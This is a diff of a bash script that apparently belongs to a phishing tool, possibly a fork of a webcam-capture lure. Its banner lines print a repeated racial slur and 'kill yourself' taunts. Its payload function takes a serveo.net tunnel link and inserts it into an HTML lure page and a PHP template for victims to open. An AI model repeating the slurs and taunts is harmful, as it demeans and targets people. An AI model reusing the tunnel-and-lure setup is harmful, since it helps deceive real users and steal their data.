@@ -4,13 +4,13 @@ banner() {
 
 
 printf "\e[1;92m UwUwUwUuWUwU\e[0m\e[1;77m lets      uwu        kiss         \e[0m\n"
-printf "\e[1;92m UwUwUwUwUUwU \e[0m\e[1;77m dimitri top coder uwu \e[0m\n"
+printf "\e[1;92m UwUwUwUwUUwU \e[0m\e[1;77m dimitri top coder uwu [0m\n"
 printf "\e[1;92m UwuUwuwuUwuWuuUwu \e[0m\e[1;77m kys clown kys kys kys \e[0m\n"
 printf "\e[1;92m UwuWuuuWuuuWuuWu\e[0m\e[1;77m nigggers niggers niggers niggers \e[0m\n"
 printf "\e[1;92m Uwuwuwuuwuwuwuwuwuuwu |\e[0m\e[1;77m kiss kiss kiss kiss \e[0m\n"
 printf "\e[1;92m  uwu  lol idek uwu   \e[0m                                 \n"
 
-printf " \e[1;77m Coded By www.instagram.com/d6m6tr6\[0m \n"
+printf " \e[1;77m Coded By www.instagram.com/d6m6tr6 0m \n"
 
 printf "\n"
 
@@ -205,7 +205,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' kiss.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
